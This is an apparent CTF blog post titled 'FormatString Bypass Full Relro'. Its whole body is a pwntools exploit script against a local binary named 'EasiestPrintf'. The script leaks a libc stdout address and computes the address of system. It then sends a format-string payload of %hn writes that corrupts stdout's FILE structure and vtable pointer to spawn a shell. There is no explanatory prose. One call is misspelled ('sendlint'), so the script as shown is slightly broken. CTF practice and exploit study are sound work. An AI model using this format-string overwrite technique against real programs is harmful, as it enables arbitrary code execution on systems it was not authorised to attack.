---
layout:     post
title:      "FormatString Bypass Full Relro"
subtitle:   "利用格式化字符串绕过full relro"
date:       2017-04-11 19:30:00 -0800
author:     "Dafeng"
header-img: "img/post-bg-universe.jpg"
header-mask: 0.3
catalog: true
tags:
    - CTF
    - Pwn
    - Format String
---

``` python
from pwn import *

p = process("./EasiestPrintf")

stdout_stdout = 0x804a044
p.recvuntil(':\n')
p.sendlint(str(stdout_stdout))
data = p.recvline()
libc_stdout = int(data, 16)
print "libc_stdout = " + hex(libc_stdout)
libc_stdout_vtable = libc_stdout + 0x94

libc_system = libc_stdout - 0x001a9ac0 + 0x3e3e0

str_sh = u32('sh\x00\x00')
x1 = libc_system
x1_hi, x1_lo = x1 >> 16, x1 & 0xFFFF
x2 = libc_stdout - 4 - 0x1c
x2_hi, x2_lo = x2 >> 16, x2 & 0xFFFF

print p.recvuntil("Good Bye\n")
buf = p32(libc_stdout) + p32(libc_stdout - 4) + p32(libc_stdout - 2) + p32(libc_stdout_vtable)

buf += '%' + str(str_sh - 16) + 'c%7$hn'
buf += '%' + str(0x10000 + x1_lo - str_sh) + 'c%8$hn'
buf += '%' + str(0x10000 + x1_hi - x1_lo) + 'c%9$hn'
buf += '%' + str(0x10000 + x2_lo - x1_hi) + 'c%10$hn'

p.sendline(buf)
p.interactive()


```
